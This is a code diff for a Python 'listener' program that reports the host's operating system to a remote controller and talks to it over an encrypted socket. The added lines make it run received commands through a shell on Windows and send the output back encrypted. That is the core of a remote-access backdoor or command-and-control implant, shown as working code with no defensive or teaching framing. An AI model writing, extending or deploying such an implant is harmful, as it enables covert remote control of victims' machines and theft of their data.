@@ -4,9 +4,8 @@ from listener.communication import Communication
 from listener.cipher import Cipher
 from tools.env import EnvReader
 import json
-import os
 import platform
-
+import subprocess
 
 def main():
     env = EnvReader()
@@ -19,10 +18,12 @@ def main():
         iv=env.get("CRYPTO_IV").encode('utf-8')
     )
 
+    system_os = platform.system()
+
     listener.init_send(json.dumps({
         "type": "init",
         "action": "setup done",
-        "params": f"{platform.system()}"
+        "params": system_os
     }).encode('utf-8'))
 
     sleep(2)
@@ -42,8 +43,28 @@ def main():
                 'params': "params"
             }).encode('utf-8')
 
+
+            if data['type'] == 'command':
+                if system_os == 'Windows':
+                    # proc = subprocess.Popen('cmd.exe', stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+                    # stdout, stderr = proc.communicate(data['action'], data['params'])
+
+                    command = data['action'] + ' ' + data['params']
+                    result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+                    response = json.dumps({
+                        'status': 'OK',
+                        'response': result.stdout
+                    }).encode('utf-8')
+
+                    print(response)
+
+                    conn.sendall(cipher.encrypt_message(response))
+                else:
+                    print('Linux')
+
             # response = cipher.encrypt_message(f"Commands received: {data['command']}")
-            conn.sendall(cipher.encrypt_message(response))
+            #conn.sendall(cipher.encrypt_message(response))
             # if data["commands"] == "download":
 
             # data = None
